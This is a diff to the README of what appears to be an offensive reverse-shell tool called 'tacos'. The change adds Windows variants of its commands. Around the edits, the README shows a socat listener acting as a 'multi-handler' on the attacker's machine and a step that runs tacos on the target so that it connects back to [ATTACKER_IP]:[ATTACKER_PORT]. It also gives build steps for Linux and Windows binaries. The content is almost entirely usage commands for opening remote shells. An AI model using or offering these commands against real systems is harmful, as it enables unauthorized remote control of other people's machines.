@@ -31,7 +31,7 @@ tmux
 ./light-pty4all/socat-listener.sh --lhost [ATTACKER_IP] --lport [ATTACKER_PORT] #multi-handler
 
 # On target (transfer tacos as you wish)
-./tacos [ATTACKER_IP]:[ATTACKER_PORT]
+./tacos [ATTACKER_IP]:[ATTACKER_PORT]       # or .\tacos.exe [ATTACKER_IP]:[ATTACKER_PORT] for windows
 # 💥
 ```
 
@@ -47,7 +47,7 @@ need `go`:
 ```shell
 git clone https://github.com/ariary/tacos.git && cd tacos
 make before.build
-make build.tacos
+make build.tacos          # or make build.tacos.windows
 ```
 
 ## Alternative
